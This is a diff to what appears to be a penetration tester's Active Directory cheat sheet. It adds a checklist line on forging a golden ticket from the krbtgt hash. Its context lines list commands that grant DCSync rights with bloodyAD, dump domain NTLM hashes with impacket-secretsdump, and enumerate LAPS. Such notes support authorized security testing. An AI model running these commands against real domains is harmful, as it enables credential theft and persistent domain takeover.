@@ -49,6 +49,7 @@ impacket-dacledit -action write -rights FullControl -principal '<Username>' -tar
 On the domain object itself, DCSync:
 bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add dcsync '<Username>'
 impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-ntlm
+- [ ] The krbtgt hash from the dump forged into a golden ticket, for persistence: :Pb golden-silver
 
 ## LAPS and gMSA
 nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps
